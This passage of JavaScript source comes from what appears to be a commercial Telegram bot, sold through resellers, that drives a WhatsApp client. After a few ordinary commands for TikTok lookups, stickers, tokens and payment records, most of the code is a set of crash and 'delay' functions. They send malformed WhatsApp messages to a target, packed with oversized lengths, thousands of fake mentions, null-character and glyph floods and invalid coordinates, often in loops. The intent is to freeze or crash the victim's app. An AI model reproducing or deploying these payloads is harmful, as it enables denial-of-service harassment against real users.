        replyText += `👤 ${video.author.nickname} (@${video.author.unique_id})\n`;
        replyText += `▶️ [Link Video](${video.play})\n`;
        replyText += `🎵 Musik: ${video.music_info.title} - ${video.music_info.author}\n`;
        replyText += `⬇️ [Download WM](${video.wmplay})\n\n`;
      });

      ctx.replyWithMarkdown(replyText);

    } catch (error) {
      console.error(error);
      ctx.reply('❌ Terjadi kesalahan saat mengambil data TikTok.');
    }
  });
  
bot.command("sticker", async (ctx) => {
  const rep = ctx.message.reply_to_message;
  if (!rep || !rep.sticker) return ctx.reply("❗ Reply ke sticker Telegram.");
  try { const link = await ctx.telegram.getFileLink(rep.sticker.file_id); ctx.reply(`🔗 URL Sticker: ${link}`); }
  catch { ctx.reply("❌ Gagal ambil URL sticker."); }
});
  
bot.hears(/^acctoken\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isResellerOrOwner(userId))) return ctx.reply("❌ Hanya reseller & developer yang bisa pakai perintah ini.");

  const token = ctx.message.text.split(" ")[1];
  if (!token) return ctx.reply("❗ Contoh: Acctoken 123456789:ABC...");

  const success = await updateGitHubJSON(tokenPath, (json) => {
    if (!json.tokens.includes(token)) json.tokens.push(token);
    return json;
  });

  ctx.reply(success ? "✅ Token berhasil ditambahkan." : "❌ Gagal menambahkan token.");
});

bot.hears(/^deltoken\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isResellerOrOwner(userId))) return ctx.reply("❌ Hanya reseller & developer yang bisa pakai perintah ini.");

  const token = ctx.message.text.split(" ")[1];
  if (!token) return ctx.reply("❗ Contoh: Deltoken 123456789:ABC...");

  const success = await updateGitHubJSON(tokenPath, (json) => {
    json.tokens = json.tokens.filter((t) => t !== token);
    return json;
  });

  ctx.reply(success ? "✅ Token berhasil dihapus." : "❌ Gagal menghapus token.");
});

bot.command("p", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  // pastikan reply pesan
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.from) return ctx.reply("❗ Harus reply ke pesan target.");

  // ambil argumen
  const args = ctx.message.text.split(" ").slice(1);
  const nominal = args[0];
  const gelar = args[1] ? args[1].toLowerCase() : null;

  if (!nominal || !gelar) {
    return ctx.reply("❗ Contoh: reply pesan lalu ketik\n/p 100000 reseller");
  }

  // validasi gelar
  const validRoles = ["reseller", "pt", "mod", "member"];
  if (!validRoles.includes(gelar)) {
    return ctx.reply("❌ Role tidak valid. Pilih salah satu: reseller, pt, mod, member");
  }

  const username = reply.from.username ? `@${reply.from.username}` : reply.from.id;
  const formatted = `${username} ${formatNominal(Number(nominal))} ${gelar.charAt(0).toUpperCase() + gelar.slice(1)}`;

  // simpan ke GitHub
  const success = await updateGitHubJSON(paymentPath, (json) => {
    if (!json.payments) json.payments = [];
    json.payments.push(formatted);
    return json;
  });

  ctx.reply(success ? `✅ Data tersimpan:\n${formatted}` : "❌ Gagal menyimpan data.");
});

bot.hears(/^listdb\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");
  
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${paymentPath}`;
    const { data } = await axios.get(url);
    const payments = data.payments || [];

    if (payments.length === 0) {
      return ctx.reply("📂 Belum ada data tersimpan.");
    }

    const listText = payments
      .map((p, i) => `${i + 1}. ${p}`)
      .join("\n");

    ctx.reply(`📜 Daftar Member Script:\n\n${listText}`);
  } catch (e) {
    console.error("Gagal ambil list:", e.message);
    ctx.reply("❌ Gagal mengambil data list.");
  }
});

//=================================================\\

async function DelayMakerInviss(target) {
for (let i = 0; i < 5; i++) {
await DelayinvisX(target)
await sleep(3000);
} 
}

async function DelayBeta(target) {
for (let i = 0; i < 125; i++) {
await VtxDelayBeta(target);
await VtxDelayBeta(target);
await sleep(1000);
}
}

async function CrashCrashCrashCrashCrash(target) {
   for (let i = 0; i < 5; i++) {
      await cttForce(target)
      await sleep(1000);
   }
}
//=================================================\\
async function DelayinvisX(target) {
  try {
    stickerPayload = {
      viewOnceMessage: {
      message: {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
        mimetType: "image/webp",
        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
        stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
        isAiSticker: false,
        isAvatar: false,
        isLottie: false,
      }
    }
  }
};
   const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 9999999999999999999,
            seconds: 99999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
   };
   groupInvitePayload = {
   groupStatusMentionMessage: {
   quotedMessage: {
      groupJid: target,
         text: "Scary",
            groupSubject: "13135550002@s.whatsapp.net",
            groupMetadata: {
            creationTimestamp: Date.now(),
            ownerJid: "13135550002@s.whatsapp.net",
            adminJids: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
          }
          }
          }
        };
    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Awas Air Panas",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Awas Air Panas",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };
    
    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});
    const msg4 = generateWAMessageFromContent(target, groupInvitePayload, {});
    
    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
   });
   
   await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
  });
   
   await sock.relayMessage(target, msg4.message, {
      messageId: msg4.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "bot",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
  });
  } catch (err) {
  console.error("Error Mengirim Bug", err);
  }
}

async function Invisible(target) {
  try {
    const stickerPayload = {
      stickerPackMessage: {
                stickerPackId: "2a020f9c-4701-4a19-8a05-358e5f50706b",
                name: "ꦾ".repeat(10000),
                publisher: "ꦽ".repeat(50000),
                stickers: [
                    {
                        fileName: "SkhRT09I4+K+pKVF3najiKZMW4AHBdeaUCwriuT-isk=.webp",
                        isAnimated: false,
                        emojis: [""],
                        mimetype: "image/webp"
                    }
                ],
                fileLength: "99999999",
                fileSha256: "1aYtTgzj90li3Zjl3iqT8qYc33giu9r2XQ2VfvXj6qI=",
                fileEncSha256: "KqlacQ4p7TypiMFnpZxrqWFnP/RJTw5LrEe6Q8BdEV0=",
                mediaKey: "vynzOrLOfRJKq5FR2IO+GiQYWimtLdM2QOMxCLx9W1I=",
                directPath: "/v/t62.15575-24/19152401_2707159986150301_6253013717572687839_n.enc",
                mediaKeyTimestamp: "1741245862",
                trayIconFileName: "2a020f9c-4701-4a19-8a05-358e5f50706b.png",
                stickerPackSize: "99999999"
            }
        };
        const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 9999999999999999999,
            seconds: 99999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
           }
         }
       }
    };
  const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Awas Air Panas",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Getsuzo Company",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
   };
  
  const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
  const msg2 = generateWAMessageFromContent(target, audioPayload, {});
  const msg3 = generateWAMessageFromContent(target, imagePayload, {});
    
 await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
   });
await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
  });
  
await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
  });
     console.log("Succes Send Delay Invisible");
    } catch (e) {
      console.error("Gagal Mengirim Invisible", e);
   }
}

async function cttForce(target) {
  const displayName = "PakTzy | Getsuzo Company ~" + "ោ៝".repeat(41);

  const vcard = `BEGIN:VCARD
VERSION:3.0
N:Getsuzo Comeback ;;;
FN:PakTzy Comeback 
item1.TEL;waid=5521992999999:+55 219-9299-9999
item1.X-ABLabel:Server
X-WA-BIZ-NAME:${"\u0000".repeat(41)}
END:VCARD`;

  // FIX FORMAT generateWAMessageFromContent
  const contact = generateWAMessageFromContent(target, {

    // ===============================  
    // CONTACT MESSAGE
    // ===============================
    contactMessage: {
      displayName,
      vcard,
      contextInfo: {
        mentionedJid: [target],
        participant: "5521992999999@s.whatsapp.net",
        remoteJid: target,
        forwardingScore: 9741,
        isForwarded: true,

        quotedMessage: {
          contactMessage: {
            displayName: "Getsuzo Company ~",
            vcard: vcard
          }
        },

        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },

        externalAdReply: {
          title: "PakTzy ~",
          mediaType: 2,
          thumbnail: img300,
          sourceUrl: "",
        }
      }
    },
    // ===============================  
    // IMAGE MESSAGE
    // ===============================
    imageMessage: {
      url: "https://files.catbox.moe/msu4dk.jpg",
      mimetype: "image/jpeg",
      caption: "Getsuzo Company ~."
    },

    // ===============================  
    // GROUP INVITE MESSAGE
    // ===============================
    groupInviteMessage: {
      groupJid: target,
      inviteCode: "GETSUZO-INVITE",
      groupName: "Getsuzo Company" + "ោ៝".repeat(999),
      inviteExpiration: Date.now() + 86400000,
      jpegThumbnail: "img300",
      caption: "Marga Tizi ~"
    }
  });

  // ===============================  
  // RELAY MESSAGE FIXED
  // ===============================
  await sock.relayMessage(target, contact.message, {
    participant: target,
    messageId: contact.key.id
  });
}

async function SqlXGlx(target) {
      let sections = [];

      for (let i = 0; i < 15; i++) {
        let largeText = "ꦾ".repeat(25);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "P",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
   groupStatusMentionMessage: {
       quotedMessage: {
       groupJid: target,
         text: "PakTzy ‼️",
            groupSubject: "13135550002@s.whatsapp.net",
            groupMetadata: {
            creationTimestamp: Date.now(),
            ownerJid: "13135550002@s.whatsapp.net",
            adminJids: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
          }
          }
          },
          
      associatedChildMessage: {
        parentKey: {
          remoteJid: target,
          fromMe: true,
          id: "1" 
        },
        message: {
          conversation: "P"
        },
      },
            interactiveMessage: {
              contextInfo: {
                 mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: "13135550002@s.whatsapp.net",
                },
              },
              body: {
                text: "Getsuzo Company",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify(listMessage),
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: JSON.stringify(listMessage),
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJSON:'{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Rildev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}',
version: 3 
},
                ],
              },
            },
          },
        },
      };

      await sock.relayMessage(target, message, {
        participant: { jid: target },
      });
    }
async function LocationX(target) {
  try {

    const msg = await generateWAMessageFromContent(target, {
      message: {
        body: {
          text: "∆",
          title: "p",
        },
        locationMessage: {
          name: "Getsuzo Company ~" + "꧀".repeat(55000),
          address: `https://${"꧀".repeat(55000)}`,
          degreesLatitude: 990.999999990,      // tetap biar sesuai gaya kamu
          degreesLongitude: 900.9999999999,    // diperbaiki typo-nya
        },
        contextInfo: {
          isForwarded: true,
          forwardingScore: 2233,
        },
      },
    });

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });

    console.log("Succesfully Sent🔥!");
    
  } catch (e) {
    console.log("❌ LocationX Error:", e);
  }
}

async function SendExternalAdReply(target) {
  try {
    const content = {
      extendedTextMessage: {
        text: "Getsuzo Company ~",
        contextInfo: {
          externalAdReply: {
            title: "Getsuzo External Ads",
            body: "Powered by RenzXml",
            mediaType: 1, // 1 = IMAGE
            thumbnailUrl: "https://files.catbox.moe/msu4dk.jpg",
            mediaUrl: "https://t.me/RapzXyzz",
            // jika punya file thumbnail, gunakan Buffer; kalau tidak, pakai Buffer.alloc(0)
            thumbnail: (typeof img300 !== "undefined" ? img300 : Buffer.alloc(0)),

            sourceType: "telegram",
            sourceId: "RapzXyzz",
            sourceUrl: "https://t.me/RapzXyzz",

            containsAutoReply: true,
            renderLargerThumbnail: true,
            showAdAttribution: true,

            ctwaClid: "GETSUZO-CLID-9912",
            ref: "GETSUZO-REF-2233",

            clickToWhatsappCall: false,
            adContextPreviewDismissed: false,
            sourceApp: "Getsuzo App",

            automatedGreetingMessageShown: true,
            greetingMessageBody: "Selamat datang di Getsuzo Company ~",

            ctaPayload: "AUTO_CTA_PAYLOAD_112233",
            disableNudge: false,

            originalImageUrl: "https://files.catbox.moe/msu4dk.jpg",
            automatedGreetingMessageCtaType: "AUTO",

            wtwaAdFormat: true,
            adType: 0, // 0 = CTWA

            wtwaWebsiteUrl: "https://getsuzo.company",
            adPreviewUrl: "https://files.catbox.moe/kjue2w.jpg"
          }
        }
      }
    };

    // === FIX: timestamp harus Date object ===
    // Jangan pakai Date.now() (itu number). Gunakan `new Date()`.
    const msg = await generateWAMessageFromContent(
      target,
      content,
      { timestamp: new Date() } // <--- penting
    );

    // relay / kirim pesan
    await sock.relayMessage(target, msg.message, {
      // bila ingin menyertakan participant, gunakan string JID, bukan object
      // participant: "12345@s.whatsapp.net", // (opsional)
      messageId: msg.key.id
    });

    console.log("✓ ExternalAdReply sent!");
    return msg;
  } catch (e) {
    console.log("❌ ExternalAdReply Error:", e);
    throw e;
  }
}




async function freezeIphone(target) {
  try {
    await sock.relayMessage(
      target,
      {
        message: {
          imageMessage: {
            url: "https://files.catbox.moe/msu4dk.jpg",
            mimetype: "image/jpeg",
            caption: "Getsuzo Company ~.",
            jpegThumbnail: null
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            isForwarded: true,
            forwardingScore: 233,
            remoteJid: target,
            participant: target,
            mentionedJid: [target], // <<< DISINI BIAR DISEBUT
            businessForwardingInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net"
            },
            quotedMessage: {
              groupStatusMentionMessage: {
                groupJid: target,
                jpegThumbnail: "img77",
                groupSubject: "13135550002@s.whatsapp.net",
                groupMetaData: {
                  creationTimestamp: Date.now(),
                  ownerJid: "0@s.whatsapp.net",
                  adminJids: [
                    "0@s.whatsapp.net",
                    "0@s.whatsapp.net"
                  ]
                }
              }
            }
          }
        },
        inviteLinkGroupTypeV2: "DEFAULT"
      },
      {
        paymentInviteMessage: {
          serviceType: "UPI",
          expiryTimestamp: Date.now() + 9999999471
        }
      },
      { messageId: null }
    );

  } catch (e) {
    console.error("Error Phenox:", e);
  }
}


async function adSqL(target) {
    const msg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "P",
            contextInfo: {
            isForwarded: true,
            forwardingScore: 667,
              remoteJid: target,
              participant: { jid: target },
                deviceIdentity: {
                    rawId: 199,
                    timestamp: Data.now(),
                    keyIndex: 5,
                    accountType: 1,
                    deviceType: 1
                }
            }
        }
    })

    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id
    });

    return msg
}


async function stickercrash(sock, target) {
  try {
    const stickerPayload = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
        mimetype: "image/webp",
        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        stickerSentTs: { low: 1, high: 0, unsigned: true },
        contextInfo: {
          isForwarded: true,
          forwardingScore: 343,
          sourceUrl: "https://t.me/RapzXyzz",
          externalAdReply: {
            title: "Getsuzo Company",
            body: "Sticker Testing",
            mediaType: 1
          }
        }
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});

    await sock.relayMessage(target, msg1.message, {
      messageId: msg1.key.id,
      remoteJid: target,
    });

    return msg1;

  } catch (err) {
    console.error("Error Mengirim Sticker:", err);
  }
}

async function sendQuestionReplyMessage(target) {
  try {
    const content = {
      questionReplyMessage: {
        message: "Getsuzo Company ~",            
        questionId: `${Date.now()}`, 
        question: "GetsuzonCompany" + "\u0000".repeat(332),
        contextInfo: {
          stanzaId: `${Date.now()}`, 
          participant: sock?.user?.id,
          quotedMessage: {
            conversation: "P",
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(
      target,
      content,
      { userJid: sock?.user?.id }
    );

    await sock.relayMessage(
      target,
      msg.message,
      { messageId: msg.key.id }
    );

    return msg;

  } catch (e) {
    console.error("Error sendQuestionReply:", e);
  }
}

async function CrashSqL(target) {
  try {
    const image = await (await fetch("https://files.catbox.moe/msu4dk.jpg")).arrayBuffer();

    const messagePayload = {
      image: image,
      caption: "Getsuzo Company ~",
      mimetype: "image/jpeg",

      contextInfo: {
        mentionedJid: [
        target,
        "0@s.whatsapp.net",
          ...Array.from({ length: 20 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
        ],

        groupStatusMentionMessage: {
          groupJid: target,
          groupSubject: "Getsuzo Company",
          jpegThumbnail: null, // optional
          groupMetaData: {
            creationTimestamp: Date.now(),
            ownerJid: "0@s.whatsapp.net",
            adminJids: Array.from({ length: 50 }, () => "0@s.whatsapp.net")
          }
        },
          externalAdReply: {
          title: "Getsuzo Company ~",
          body: "p",
          mediaType: 1,
          thumbnail: Buffer.alloc(4096),
          sourceUrl: "https://t.me/RapzXyzz",
        },
      }
    };

    await sock.sendMessage(target, messagePayload);

    console.log("✔ Succes sent!");
  } catch (err) {
    console.error("❌ Error:", err);
  }
}

async function sendFCSafeStyle(sock, jid) {
  try {
    // ambil buffer gambar
    const img = await (await fetch("https://files.catbox.moe/msu4dk.jpg")).arrayBuffer();

    const messagePayload = {
      image: img,
      caption: "P" + "ᯤ".repeat(2000), // oversize aman

      mimetype: "image/jpeg",

      contextInfo: {
        mentionedJid: [
          jid,
          "0@s.whatsapp.net",
          ...Array.from({ length: 20 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
        ],

        // Struktur FC yang kamu inginkan → TETAP ADA
        groupStatusMentionMessage: {
          groupJid: jid,
          groupSubject: "Getsuzo Company",
          jpegThumbnail: Buffer.alloc(3000), // dummy aman
          groupMetaData: {
            creationTimestamp: Date.now(),
            ownerJid: "0@s.whatsapp.net",
            adminJids: Array.from({ length: 50 }, () => "0@s.whatsapp.net")
          }
        },

        // oversized custom metadata (biasanya dipakai untuk FC)
        externalAdReply: {
          title: "Getsuzo Company ~",
          body: "Test Oversize Payload",
          mediaType: 1,
          thumbnail: Buffer.alloc(4096),
          sourceUrl: "https://example.com",
        },

        // nested context (ciri khas FC)
        // dibuat aman, tidak memicu crash
        isForwarded: true,
        forwardingScore: 999999,
      }
    };

    await sock.sendMessage(jid, messagePayload);

    console.log("✔ Pesan FC-style aman terkirim");

  } catch (err) {
    console.error("❌ Error FC-style:", err);
  }
}

async function CrashSqL2(target) {
  try {
    const messagePayload = {
      image: { url: "https://files.catbox.moe/msu4dk.jpg" },
      caption: "PhenoxScary ",

      contextInfo: {
        mentionedJid: [

        target,

        "0@s.whatsapp.net",

          ...Array.from({ length: 20 }, (_, i) => `1000000000${i}@s.whatsapp.net`)

        ],
        participant: target,
          remoteJid: "status@broadcast",

        quotedMessage: {
          groupStatusMentionMessage: {
            groupJid: target,
